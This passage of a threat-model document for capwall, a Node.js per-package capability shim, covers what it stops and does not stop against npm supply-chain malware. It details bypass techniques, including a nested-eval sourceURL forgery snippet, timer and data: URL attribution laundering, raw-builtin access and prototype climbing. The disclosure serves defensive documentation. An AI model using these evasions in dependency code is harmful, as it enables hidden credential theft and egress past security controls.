  Buffer); the encoding strategy is tracked for reconsideration (issue).
- **`exists`/`existsSync`** remain the bespoke non-throwing existence probes: a denial reads
  as "does not exist" (`false` / `cb(false)`), never an error at all.

This is unchanged in spirit from before — enforce mode still fails loudly and a policy gap
still surfaces as a real error, not a silent allow — only the DELIVERY CHANNEL now matches
what the real `fs` API would use for that call shape. This is most likely to matter during
the observe→tighten→enforce rollout while a policy is still incomplete; run `observe` until
coverage is stable before flipping to `enforce`. Path matching is POSIX-oriented
(`/`-separated); Windows drive-letter paths are not matched by relative grants yet.

## Adversary we are designed to stop

**Opportunistic, worm-style supply-chain malware** delivered through a compromised npm
dependency. Concretely, the class exemplified by:

- **Shai-Hulud** (Nov 2025) — a self-propagating npm worm.
- **Glassworm** (2026) — malware that runs at **both** the lifecycle-script (install) phase
  **and** the application-runtime phase.

The critical observation: these payloads execute at **application runtime**, not only at
install. Install-time defenses — lockfile pinning, `--ignore-scripts`, registry scanners,
socket brokers — never see the runtime phase, where credential theft, wallet drain, and
lateral movement actually happen. capwall lives in the running process and mediates that
phase.

Such malware is typically **opportunistic**: it tries to read `process.env`, open a socket
to an exfiltration host, spawn a shell, or write to a persistence path. It does **not** go
out of its way to break out of a capability shim. That is exactly the behavior capwall's
per-package capability policy catches: a logger that suddenly opens a network socket, or a
string-formatting helper that reads environment secrets, is a policy violation.

## What capwall stops

When a package's declared capabilities are tight, capwall denies (in `enforce` mode) or logs
(in `observe` mode) attempts by that package to:

- Read/write files outside its allowed path globs (`fs`).
- Open network connections to hosts/ports outside its allowlist — through the `net`, `http(s)`,
  `tls`, `http2` and `dgram` **module** surfaces, and (since #80) through the **global** APIs
  `fetch`, `WebSocket` and `EventSource`. All of them evaluate against the same `net` grant. See
  "Global egress surfaces" above for the global guard's own limits, chiefly redirects.
- Spawn subprocesses when `child_process` is not permitted (**gating** the spawn).
- Spin up `worker_threads` when not permitted.
- Read `process.env` keys outside its allowlist (e.g. exfiltrating `AWS_SECRET_ACCESS_KEY`
  from a package with no reason to see it).
- Use `vm` when not permitted.
- Load a native `.node` addon when not permitted (**gating** the load only — read
  § Native `.node` addons before granting it).

The **trace→policy DX** makes those policies practical to author: run once in `observe`,
emit a starter policy scoped to what each package *actually* did, tighten it, enforce.

## What capwall does NOT stop (out of scope for confinement)

capwall does **not** harden JavaScript primordials (that is SES's job — see below). Without
frozen primordials, a **determined in-process attacker** can defeat it via, among others:

- **Prototype pollution** and **shared mutable primordials** — mutating
  `Object.prototype`/`Array.prototype`/etc. to influence code in other packages, or to
  tamper with capwall's own bookkeeping.
- **Un-patching the shims** — reaching for the original, un-wrapped core module reference and
  calling it directly. This is **cheap, not exotic**: capwall returns a plain, mutable shim
  object (deliberately un-frozen, so legitimate `fs` monkey-patchers such as `graceful-fs`
  keep working — the no-SES-tax tradeoff). A dependency can reassign the shim's methods, or
  reach the raw builtin through channels capwall does not mediate. Both the CJS `require` and
  the ESM `import` paths ARE mediated (M4/M5), so `require("node:fs")` and
  `import … from "node:fs"` both return the shim — but capwall does not chase every reflective
  escape hatch, and at least one is a **plain public API**: `process.getBuiltinModule("node:fs")`
  (Node ≥22) returns the real, un-shimmed module, as does `process.binding`, internal module
  caches, or a builtin loaded from a context capwall has not patched. `getBuiltinModule` is
  path-independent (it defeats the CJS patch identically), so this is not specific to ESM. The
  shim is a **shared, process-wide singleton**, so a single dependency that does un-patch it
  **silently disables enforcement for every other package and the app**, not just for itself,
  with no log line. Treat capwall's mediation as effective only against packages that do not
  go looking for the raw builtin. **Opt-in hardened mode (#17) closes the reassignment half of
  this** — see § Hardened mode below for exactly how much, and how little, that buys. It does
  nothing about `getBuiltinModule` and the other raw-builtin paths in this bullet. On the ESM
  path specifically, **hijacking the loader-hook chain** is a second route with the same
  disables-it-for-everyone property; it is now gated and logged rather than silent, but not
  closed — see "Loader-hook registration (#61)" above for exactly what remains.
- **Global egress APIs** — `fetch`, `WebSocket` and `EventSource` are globals, not module
  exports, so the loader-interception mechanism never sees them. They are now mediated by a
  separate `globalThis` guard (#80), which closes the plain gap this bullet used to describe. What
  is left is narrower and named under "Global egress surfaces" above: **redirect hops are guarded
  only after the request has gone out**, `init.dispatcher` can supply the dialing code (re-gated
  only where it dials through a mediated module), a pre-install capture holds the raw function,
  and the guarded global is replaceable unless hardened mode is on.
- **fd / symlink escapes** — using an already-open file descriptor, or a symlink, to reach a
  path outside the allowed globs.
- **`vm` / `eval` / `node:sqlite`** and similar reflective or alternate-execution surfaces
  that can sidestep the shimmed API. What these surfaces buy an attacker is reaching APIs
  capwall does not mediate at all, and (with a `vm` grant) choosing the filename its frames
  report. For what `eval`'d code is charged to, see § `eval` and `new Function` below — the
  claim made here after #60, that V8 tells us where such code was compiled, was **wrong**, and
  the correction is #84.
- **Attribution laundering** — capwall attributes each call to the **nearest** package frame
  on the stack (see `core/src/attribution`). A malicious package that arranges for its
  operation to be *executed by* a trusted helper's code (passing a path to a logger that
  writes it, scheduling work a broadly-granted package performs) is charged to the helper.
  Keep helper grants tight; broad grants are laundering targets.

  **What is now closed (issue #60).** This entry used to describe the whole risk, and it was
  wrong: laundering did not require a trusted helper at all. The walk discarded every frame
  with no filesystem path and then fell off the end into `<app>` — so "capwall could not work
  out whose code this is" and "this is the application" were one value, and `<app>` is exempt
  from the `process.env` and `dgram` gates. A dependency reached that state with ~15 lines of
  ordinary ESM: run the payload from a `data:` URL module (no path on any frame) and detach one
  tick through a timer (V8's async stack traces keep the dependency on the stack if it `await`s
  straight through, so the detachment was the essential part). It could then read any
  `process.env` key and send UDP **with no log line at all**, because the `<app>` short-circuit
  returned before `evaluate()`/`onDecision()`. `eval`, `new Function`, and — needing neither
  `data:` nor `eval` — handing a native function to a timer (`setTimeout(Object.assign, 0,
  stash, process.env)`, `setTimeout(sock.send.bind(sock), …)`) all reached the same state. That
  was a fail-open in exactly the Shai-Hulud shape capwall exists to stop, and it is fixed at
  the attribution layer, so all of those vectors close together: an unattributable call is now
  `<unknown>` and is evaluated like any other principal.

  **What remains.** Nearest-package is still nearest-package, so a dependency can still route
  work through a broadly-granted helper (including the app itself) and be charged to it. It can
  still **deliberately deepen or launder its own stack** — push its frame past the frame budget,
  or arrange for another package's frame to be the nearest one — and a `vm` grant lets it name
  any file it likes (`vm.runInThisContext(code, { filename: "…/node_modules/lodash/x.js" })`
  produces frames that attribute to `lodash`). A file that is not under any `node_modules` is
  `<app>` regardless of where it lives, so a dependency that can write a file **and** load it
  (`require("/tmp/x.js")`) is charged to the app; the fs write is itself gated, but a dependency
  with any write grant plus load is an escalation path. And granting `<unknown>` broadly in a
  policy restores an exemption for every unattributable call by hand. These are the
  determined-in-process-attacker class, same as un-patching the shims — real, and not papered
  over.
- **`eval` and `new Function` — what they are charged to (issue #84).** An `eval`/`new Function`
  frame has no `getFileName()`. Between #60 and #84 capwall recovered a name for it by parsing
  V8's `getEvalOrigin()`, which for code V8 compiled itself reads `eval at <fn> (<file>:L:C)`.
  A `//# sourceURL=` replaces that string wholesale, so only V8's own form was accepted, on the
  reasoning that the `"eval at "` prefix could not be forged because **a `sourceURL` may not
  contain whitespace**.

  **That reasoning was wrong, and the resulting hole was critical.** The whitespace claim itself
  holds — V8 rejects a `sourceURL` containing a space and reports the genuine origin — but it
  only ever covered a *single* `eval`. For a **nested** `eval`, V8 synthesizes the `eval at <fn>
  (…)` wrapper itself, around the outer script's name, and the outer script's name is exactly
  what its own `sourceURL` set. The attacker never writes the prefix; V8 writes it for them:

  ```js
  const inner = "<payload>";
  const outer = `eval(${JSON.stringify(inner)})\n//# sourceURL=/proj/node_modules/lodash/index.js:1:1`;
  eval(outer); // getEvalOrigin() === "eval at <anonymous> (/proj/node_modules/lodash/index.js:1:1)"
  ```

  No whitespace anywhere, and the `:1:1` the attacker appended completes the shape. A dependency
  with **zero grants** thereby ran with any granted package's capabilities — every capability,
  not just `env` — or with `<app>`'s, whose `process.env` reads are exempted *before* the
  decision is recorded, so that variant needed no granted package in the policy and produced no
  log line at all. The forged path did not have to exist; attribution never touches the disk.

  **No stricter parse recovers it.** V8's depth-1 origin is `eval at <fn> (<script>:L:C)`; its
  depth-N origin is `eval at <fn> (` + the outer script's origin + `)`. When the outer script
  carries a `sourceURL`, its origin *is* that bare `sourceURL`, so a forged depth-2 origin is
  character-for-character the shape of a genuine depth-1 one. Counting `eval at ` tokens, taking
  the outermost match, or requiring a trailing `:L:C` all fail on the same input. V8 exposes the
  origin only as a formatted string — there is no structured accessor — so there is nothing else
  to consult.

  **What capwall does now.** `getEvalOrigin()` is not read. An eval frame is treated like every
  other frame with no filesystem identity: opaque, skipped, and the walk continues to the nearest
  frame that has a real file name. Concretely:

  - A dependency that compiles and **synchronously runs** its own code — a template engine,
    `ajv`, anything using `new Function` for speed — still has its own frame directly beneath,
    so it is still charged **by name** and keeps exactly its own grants. This is the common
    legitimate case and it is unchanged.
  - **Detached** eval'd code (`eval("setTimeout(payload)")`) leaves no real frame behind and is
    `<unknown>`. #60's fail-closed half survives — it is gated and recorded, never `<app>` — but
    #60's by-name precision for this case does not, because it rested on a forgeable string.
  - The **application's own** `eval` is `<unknown>`, not `<app>`. The trust root carries
    exemptions, so it may not be inferred through code with no identity; otherwise a dependency
    that persuades the app to `eval` a string it supplied inherits the app's authority.

  Grant `"<unknown>"` explicitly if a real tree needs the last two — narrowly, and knowing that
  grant is shared with every other unattributable caller.

  **What remains.** Eval'd code is now laundered exactly as a `data:` module already could be:
  if a **granted** package invokes an attacker-supplied closure that has no file identity, the
  granted package's frame is the nearest one and is charged. That is the nearest-package residual
  in the bullet above, reachable on any released capwall via `data:` and not new here — but the
  fix does bring `eval` into the same residual, where before the (forgeable) origin string
  happened to name the compiling package instead.
- **Package identity is a path, not a verified fact.** `packageForPath` reads the name from the
  last `node_modules/<name>` segment and never touches the disk, so **any code running from such
  a path is that package**. Two consequences worth stating plainly, both distinct from #84 and
  neither closed by it:
  - A dependency that ships a directory named after a granted package inside its own tree
    (`node_modules/evil/node_modules/lodash/…`, e.g. via `bundledDependencies`) and runs code
    from it is charged to that name. No `eval`, no `vm`, no `fs` write. **Issue #92.**
  - `new (require("node:module"))(…)._compile(src, "…/node_modules/lodash/x.js")` compiles code
    with a caller-chosen filename, and the resulting frames report it. The `node:module` shim
    gates hook registration, not compilation. **Issue #93.**

  Both let a dependency **name** a granted package, under deny-by-default `enforce`, with no log
  line. They are tracked separately from #84 because the fix is different in kind — verifying
  package identity against the installed tree, rather than declining to read a self-reported
  string — and a partial fix here would look like a fix without being one. Until they are
  closed, treat a package name in a policy as identifying *a path*, not a verified publisher.
- **Deep stacks past the attribution frame budget** — the walk inspects at most `maxFrames`
  frames (default 25). When the owning dependency's frame is deeper (long promise chains,
  dynamically-compiled or deeply-nested wrappers, `async_hooks`-heavy frameworks), the walk
  runs out of budget without finding it. That used to fall back to `<app>`, the trust root,
  which could **wrongly allow** the call; since #60 it falls back to `<unknown>`, so it is
  denied by default in enforce instead — a capped attribution now fails closed, including on
  the `process.env` and `dgram` paths that exempt `<app>`. The trade is the other direction:
  a benign deep stack is **wrongly denied** rather than wrongly allowed. Mitigation: the budget
  is configurable — `CAPWALL_MAX_FRAMES` for the preload/CLI, `install(…, { attribution: {
  maxFrames } })` in-process — and an exhausted walk is **flagged, not silent** (the decision
  carries `attributionTruncated: true`; the preload warns once on stderr), so the fix is to
  raise the budget rather than to grant `<unknown>`. This is still a **mitigation, not a fix**:
  a dependency can deliberately deepen its own stack past whatever budget is configured, which
  now costs it its grants rather than gaining it the app's. Raising the budget costs throughput
  on every mediated call (issue #15).
- **Native `.node` addons** — arbitrary compiled code. Since S2 (#49) capwall **gates the
  load**; it does not confine the addon. Full treatment in § Native `.node` addons below.
- **Subprocess internals** — capwall can gate *whether* a `child_process` spawn happens, but
  once a child process runs it is outside capwall's process and outside its confinement.

**Gating vs confinement.** For native addons and subprocesses, capwall provides **gating**
(a policy decision about whether they are allowed to start) but **not confinement** (control
over what they do after starting). Do not treat a gated-but-allowed addon or subprocess as
confined.

## Hardened mode (opt-in, off by default) — issue #17

`install(policy, mode, { hardened: true })`, or `CAPWALL_HARDENED=1` for the CLI preload,
freezes the capability surfaces capwall hands to dependencies. It exists because the default
shim is a plain mutable object, so `fs.readFileSync = evil` is a one-line, un-logged removal
of enforcement **for the whole process** (the un-patching bullet above). Hardened mode is
**off by default and must stay off by default** — see the graceful-fs cost below.

**What it freezes** (only objects capwall itself created — never a builtin):

- Every shim **namespace** handed to a dependency: `fs`, `fs.promises`, `net`, `http`,
  `https`, `tls`, `http2`, `dgram`, `child_process`, `worker_threads`, `vm`. So
  `fs.readFileSync = evil`, `delete fs.readFileSync`, and
  `Object.defineProperty(fs, "readFileSync", …)` all fail.
- Every guarded **wrapper function** on those namespaces, including wrappers hanging off
  other wrappers (`fs.realpath.native`).
- Every guarded **class in every shim — and its prototype**. That is the complete set from
  "Capability-bearing classes" above: the prototype-method sites (`net.Socket`,
  `tls.TLSSocket`, `http(s).Agent`, `dgram.Socket`, `child_process.ChildProcess`) and the
  constructor sites (`fs.ReadStream`/`WriteStream` + their `File*Stream` aliases,
  `vm.Script`/`SourceTextModule`/`SyntheticModule`, `worker_threads.Worker`,
  `http(s).ClientRequest`). The prototype freeze is what matters for the method sites:
  `net.Socket.prototype.connect = evil` is otherwise the same one-line un-guard, one level
  down. Freezing a guarded class does **not** stop `class Mine extends fs.ReadStream {}` —
  that reads the frozen class and writes to a new one.
- The guarded `send`/`connect` properties capwall installs for a `dgram` socket — on the
  instance for a `createSocket()` result, on the guarded subclass's prototype for
  `new dgram.Socket()`. The socket itself is never frozen (it needs its mutable state), so these
  are pinned individually: installed as **accessors with no setter and `configurable: false`**,
  which gives `socket.send = evil` the same outcome `writable: false` did (a `TypeError` under
  `"use strict"`, a silent no-op in sloppy mode) and makes
  `Object.defineProperty(socket, "send", …)` and `delete socket.send` fail. An accessor rather
  than a pinned data property because the guard has to be able to choose what Node's own
  internal `this.send` read yields, for one authorized call, WITHOUT redefining the property —
  issue #86 was the collision between that need and the pin, and it made every allowed
  `dgram.createSocket().send()` throw `Cannot redefine property: send` under hardened mode. An
  accessor is computed per read, so there is nothing left to compete over.
- The **guarded global egress surfaces** (#80): `globalThis.fetch`/`WebSocket`/`EventSource` are
  installed **non-writable**, so `globalThis.fetch = evil` fails, and the guarded wrapper /
  subclass is frozen. They stay **`configurable`** on purpose — a non-configurable global could
  never be restored by `uninstall()`, which would leave a permanent process-wide mutation. So
  `Object.defineProperty(globalThis, "fetch", …)` still un-gates them; that is the deliberate
  price of a restorable global, and it is the same class of escape as climbing past a guarded
  prototype.

**It applies to `import` as well as `require`,** and that is now asserted rather than assumed.
The #86 sibling audit found it had NOT: the ESM path built its shims from a context onto which
`hardened` was never mirrored, so `CAPWALL_HARDENED=1` froze nothing at all on the path
`capwall run` enables by **default**. The namespace half is moot under ESM (a module-namespace
object rejects assignment on its own), but `net.Socket.prototype.connect = evil` and
`dgram.Socket.prototype.send = evil` landed — silently, under the mode enabled to stop exactly
that. #87's live-context rework closed it in passing, which is luck, not coverage: nothing in the
suite crossed hardened mode with the ESM path, so it could have regressed as quietly as it
arrived. `test/hardened.test.ts` now pins both states of the `CAPWALL_HARDENED` override on the
ESM path.

One consequence of `hardened` is worth stating plainly, because `Object.freeze` is irreversible
and everything else about an install IS live: a shim reference a module already captured keeps
the hardening of the install that first built it. A later install with a different `hardened`
gets correctly-hardened shims for anything freshly handed out — the registry is memoized per
hardened-ness — but it cannot un-freeze, or retroactively freeze, what is already held.

Note the dependency on issue #64: while `fs.ReadStream`, `vm.Script` and
`worker_threads.Worker` were construct-trap Proxies, hardened mode could not freeze them at
all — `Object.freeze` on a Proxy forwards `[[PreventExtensions]]`/`[[DefineOwnProperty]]` to
its **target**, so freezing one would have frozen the real builtin class process-wide,
outliving `uninstall()`. Converting them to guarded subclasses made them capwall-owned
objects, and therefore freezable. Hardened mode now covers every guarded class, not a subset.

**Observable behavior of a blocked patch.** Freezing does not raise an alarm. A write to a
frozen object **throws a `TypeError` only under `"use strict"`**; in sloppy-mode CJS — which
is what most published packages still are — it **silently no-ops**. There is no capwall log
line for a blocked patch attempt. The guarantee is only that the original guarded method is
still installed and still enforcing afterwards.

**What it does NOT protect against.** Hardened mode raises the cost of un-patching. It is not
a sandbox and it closes none of the following, each re-verified against a hardened install
with a deny-all `enforce` policy:

- **`process.getBuiltinModule("node:fs")`** (Node ≥22) — a plain public API returning the
  real, un-shimmed module; the read succeeds. Also `process.binding`, internal module caches,
  and builtins loaded from a context capwall has not patched. These never touch a shim object,
  so freezing shim objects is irrelevant to them. **This alone makes hardened mode
  defense-in-depth, not a boundary.**
- **`http.globalAgent` / `https.globalAgent` (issue #65)** — the shim's `Agent` **class** is
  guarded, but `globalAgent` is a real `Agent` instance passed through untouched, so
  `http.globalAgent.createConnection({host, port})` is un-gated egress with or without
  hardened mode. Freezing cannot fix this: the object is a builtin instance, not a capwall
  object, and the missing guard is the problem, not a writable property.
- **Replacing `process.env` wholesale** — the env read allowlist is a `Proxy` over the live
  `process.env`, not a capwall-created namespace. Freezing it would break `process.env.X = y`
  for the whole process and freeze the real environment object, so it is left alone;
  `process.env = {…}` still un-gates env reads.
- **Shadowing a guarded PROTOTYPE method with an own property on an instance.** The `dgram`
  pin above is complete for a `createSocket()` result, where the guard is an own property of the
  socket, but only half-complete for `new dgram.Socket()`, where it lives on the guarded
  subclass's frozen prototype: assignment (`socket.send = evil`) fails, because assignment
  consults the inherited setter-less accessor, but `Object.defineProperty(socket, "send", …)`
  succeeds — `[[DefineOwnProperty]]` does not consult the prototype chain, and the socket cannot
  be frozen. Closing it would mean freezing every socket, which a socket does not survive. This
  is asserted, not assumed: `test/dgram.test.ts` pins both halves so the asymmetry stays a
  recorded decision.
- **Climbing PAST a guarded class**, exactly as documented under "Capability-bearing classes":
  `Object.getPrototypeOf(net.Socket.prototype).connect` still reaches the real method, and
  `new (Object.getPrototypeOf(fs.ReadStream.prototype).constructor)(deniedPath)` still reaches
  the real class. Freezing capwall's subclass says nothing about the real class above it.
- **Prototype pollution / primordials / fd + symlink escapes / `eval` / native addons /
  subprocess internals / attribution laundering / deep stacks** — all unchanged. Hardening
  primordials is SES's job.

What hardened mode **did** close, verified the same way: `fs.readFileSync = evil`,
`delete fs.readFileSync`, `Object.defineProperty(fs, …)`, `fs.promises.readFile = evil`,
`net.Socket.prototype.connect = evil`, and replacing a guarded class on its namespace
(`fs.ReadStream = evil`, `vm.Script = evil`, `worker_threads.Worker = evil`) — each is a
silent no-op or a `TypeError`, with the original guard still denying afterwards.

**Cost: it breaks `graceful-fs`, and therefore anything that depends on it.** `graceful-fs` is
a transitive dependency of npm, webpack, and a large fraction of the ecosystem, and it patches
`fs`'s methods at load time. Against a frozen `fs` that patch throws a `TypeError` (its
sources are strict-mode), so the dependent package fails to load. The same applies to every
other legitimate `fs` monkey-patcher. Enabling hardened mode is a deliberate trade: you lose
`graceful-fs`-class compatibility — the no-SES-tax property that is capwall's whole adoption
argument — and gain the closure of the reassignment escape only. Try it in `observe` mode
first; a load-time `TypeError` from a patcher is what failure looks like.

## Native `.node` addons

**What the gate does: a load-time decision. What it does not do: any confinement
whatsoever.** Those are the terms, and they are not softened anywhere in this project.

capwall attributes every native-addon load and evaluates it against the `native` capability
(deny-by-default in `enforce`, recorded in `observe`). The answer it produces is exactly one
bit: *may this package bring compiled code into this process*. Once the answer is yes and
`dlopen` returns, capwall's view ends. The addon runs with the process's full ambient
authority — it calls `open(2)`, `connect(2)` and reads `environ` directly, never touching a
shimmed JS builtin — and none of that is visible to capwall, let alone controllable by it.
This is the deliberate scope, not a gap awaiting a fix: confining native code would require a
different mechanism entirely (an OS sandbox — seccomp, a container, a jail), which is a layer
below capwall and is where that job belongs.

So: **a granted addon is an unconditional grant of everything.** A package with
`"native": true` and `"net": { "hosts": [] }` is not a package that cannot reach the network.
It is a package whose *JavaScript* cannot reach the network, and which you have separately
allowed to load code that can. Grant `native` the way you would decide to trust a package
completely, because that is what it is.

The value the gate does provide is real but narrow, and worth stating precisely:

- **You know.** A `.node` load was previously invisible — unattributed and ungated. It now
  appears in the observe log, in the trace, and in `capwall diff`, named to a package and a
  file. A dependency that *starts* shipping or downloading an addon is drift you will see.
- **You decide.** Deny-by-default means a package that had no native code when you reviewed
  it cannot silently acquire some in a later version and have it load. That is the
  supply-chain shape capwall exists for: the compromised update, not the addon that was
  always there.

### Coverage

The gate is a patch on `process.dlopen`, which is the single JS-reachable chokepoint every
addon load passes through: `Module._extensions[".node"]`'s entire body is
`return process.dlopen(module, path.toNamespacedPath(filename))` (verified against Node 20.20,
22.22 and 24.18). Consequently it covers `require("./build/Release/foo.node")`, a **direct**
`process.dlopen(...)` call that bypasses the module system entirely, and the resolver wrappers
real native packages use — `bindings` and `node-gyp-build` both end at a plain `require()` of
the `.node` file, and `@mapbox/node-pre-gyp` only resolves a path that the consuming package
then requires. Gating the literal `require` specifier alone would have left the direct `dlopen`
call open and made the gate decorative.

Being a `process.dlopen` patch rather than a loader hook also makes it module-system-independent
for free: it is on whether or not the ESM hook is registered, and it does not care that Node
itself refuses `import("./foo.node")` outright (`ERR_UNKNOWN_FILE_EXTENSION` — the only route
from ESM is `createRequire`, which lands back in the CJS `.node` extension handler and so back
here).

Because those resolvers call `require` from their own source file, the nearest stack frame is
the resolver, not the package whose addon is loading. A `.node` load is therefore charged to
**both** the caller and the principal the addon file belongs to — the owning package, `<app>`
for the project's own build output, `<unknown>` for a file under neither — and both must be
granted. See `docs/policy-format.md` § `native` for what that means for a policy. Without the
caller subject, an `observe` run would hand you `"node-gyp-build": { "native": true }`, a
single grant unlocking native loads tree-wide; without the `<unknown>` case, a `.node` written
to a temp dir and dlopened would be charged to `<app>` and ride on the trust root's grants —
the same fail-open #60 closed for the stack walk, arriving by a different route.

### Known non-coverage, stated rather than implied

- A **`worker_threads.Worker`** is a fresh Node context with its own `process` object, so the
  patch does not exist inside it. Workers are gated separately by `worker_threads`; a package
  granted that gate can load an addon inside a worker un-gated.
- A dependency that captured `process.dlopen` **before capwall installed** keeps an un-gated
  reference — the same pre-install-capture residual as every shim. Install via the `--import`
  preload.
- `process.dlopen` is a writable property of `process`, so **un-patching it** is as cheap as
  un-patching any other shim, and the same caveat applies: capwall does not claim to stop
  in-process code that goes looking for the raw primitive.
- Node's experimental `require.addon()` is a C++-side loader that may not route through
  `process.dlopen`. It is absent on Node 20.20, 22.22 and 24.18 as shipped, and
  `node-gyp-build` prefers it when present (`typeof runtimeRequire.addon === "function"`) —
  so it is a live upgrade risk, not a hypothetical. Recheck this hook when it stabilizes.
- An addon already loaded into the process **before** capwall installed is not unloaded and
  not re-gated. The gate is about loads, and only about loads that happen after it is on.
- **Hardened mode (#17) does not help here.** It freezes shim objects; `process.dlopen` is a
  property of `process`, which capwall does not freeze (freezing `process` would break far more
  than it protects). Hardening and this gate are independent controls.

## Comparison to other threat models

### vs SES / hardened primordials (LavaMoat, Endo)

SES freezes the primordials and runs each package in a compartment, so prototype pollution
and primordial-tampering attacks in the list above are largely **in scope** for SES to stop.
capwall accepts those as **out of scope** in exchange for **no SES tax**: no broken packages
from frozen intrinsics, no uneven ESM/native-addon story, near-zero adoption friction.
capwall offers *weaker isolation, dramatically lower friction*. For a hostile,
break-out-motivated adversary, prefer SES; for containing opportunistic supply-chain malware
in an existing Node service with minimal changes, capwall is the pragmatic choice. The two
are composable.

### vs Node's `--permission` model

Node's built-in permission model is **process-global**: one `--allow-fs-read` set applies to
the entire process, so you cannot say "express may read `./views`, but this transitive dep
may read nothing." capwall's contribution is exactly the **per-package** dimension. Node's
model, being enforced deeper (in the runtime, not via JS shims), is harder to un-patch —
another reason capwall is defense-in-depth *alongside* it, not a replacement.

### vs scanners (guarddog, Socket)

Scanners try to **detect** a malicious package before or as it enters your tree. capwall
assumes detection failed and a bad package is present, then **contains what it can do at
runtime.** Complementary layers, not competitors.

## Residual risk statement

Deploying capwall in `enforce` mode meaningfully raises the cost of opportunistic
supply-chain malware and gives you a per-package audit trail. It does **not** provide a
security boundary against a determined, capwall-aware in-process attacker. Treat it as one
layer of defense-in-depth, alongside dependency review, lockfile pinning, least-privilege
process/OS sandboxing (containers, seccomp), and secret hygiene.
